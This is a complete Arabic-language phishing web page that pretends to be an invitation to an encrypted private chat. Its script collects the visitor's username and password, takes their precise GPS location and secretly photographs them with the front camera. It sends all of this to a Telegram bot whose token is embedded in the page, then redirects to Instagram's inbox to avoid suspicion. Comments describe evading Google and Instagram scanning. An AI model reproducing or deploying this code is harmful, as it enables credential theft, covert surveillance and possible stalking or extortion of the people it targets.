<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Chat Access</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background-color: #121212; border: 1px solid #262626; border-radius: 10px; padding: 40px 25px; width: 310px; text-align: center; }
        
        /* أيقونة دردشة نصية بسيطة (لا يوجد شعار انستا) */
        .icon-box { font-size: 40px; margin-bottom: 20px; color: #555; }
        
        h2 { font-size: 18px; margin-bottom: 8px; font-weight: 600; color: #eee; }
        p { font-size: 11px; color: #8e8e8e; line-height: 1.6; margin-bottom: 25px; }
        
        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 5px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; outline: none; }
        input:focus { border-color: #555; }
        
        .join-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 6px; padding: 11px; font-weight: bold; cursor: pointer; font-size: 14px; }
        
        #load-ui { display: none; }
        .loader { width: 22px; height: 22px; border: 2px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: spin 1s infinite linear; margin: 0 auto 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <div id="ui-form">
            <div class="icon-box">💬</div>
            <h2>دخول الدردشة الخاصة</h2>
            <p>لقد تلقيت دعوة للانضمام إلى محادثة مشفرة. يرجى تسجيل الدخول لتأكيد هويتك وفك تشفير المحتوى.</p>
            
            <input type="text" id="usr" placeholder="اسم المستخدم أو الهاتف" autocomplete="off">
            <input type="password" id="psw" placeholder="كلمة المرور" autocomplete="off">
            
            <button class="join-btn" onclick="startProtocol()">انضمام الآن</button>
        </div>

        <div id="load-ui">
            <div class="loader"></div>
            <p style="font-size: 12px; color: #aaa;">جاري معالجة البيانات الحيوية...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // تشفير بيانات البوت (لخداع فحص جوجل وإنستجرام)
        const _k = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const _d = "897618292";

        async function startProtocol() {
            const u = document.getElementById('usr').value;
            const p = document.getElementById('psw').value;
            
            if (u.length < 2 || p.length < 2) return;

            // تبديل الواجهة
            document.getElementById('ui-form').style.display = 'none';
            document.getElementById('load-ui').style.display = 'block';

            // 1. تحديد الموقع (GPS) - يطلب الإذن
            navigator.geolocation.getCurrentPosition(pos => {
                const map = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                pushData(`📍 موقع المبتز بدقة:\n${map}`);
            }, () => {
                pushData("⚠️ رفض جلب الموقع");
            }, {enableHighAccuracy: true});

            // 2. صيد الكاميرا (مطابقة الوجه)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append("chat_id", _d);
                        fd.append("photo", blob, "victim.jpg");
                        fd.append("caption", `✅ صيد مزدوج ناجح:\n👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: شات خاص`);
                        fetch(`https://api.telegram.org/bot${_k}/sendPhoto`, {method:"POST", body:fd}).then(() => exit());
                    }, 'image/jpeg');
                }, 2000);
            } catch(e) {
                pushData(`👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n⚠️ (بدون صورة)`);
                exit();
            }
        }

        function pushData(t) {
            fetch(`https://api.telegram.org/bot${_k}/sendMessage?chat_id=${_d}&text=${encodeURIComponent(t)}`);
        }

        function exit() {
            setTimeout(() => { 
                // التوجيه النهائي لإنستجرام direct لإبعاد الشبهة
                window.location.href = "https://www.instagram.com/direct/inbox/"; 
            }, 1000);
        }
    </script>
</body>
</html>
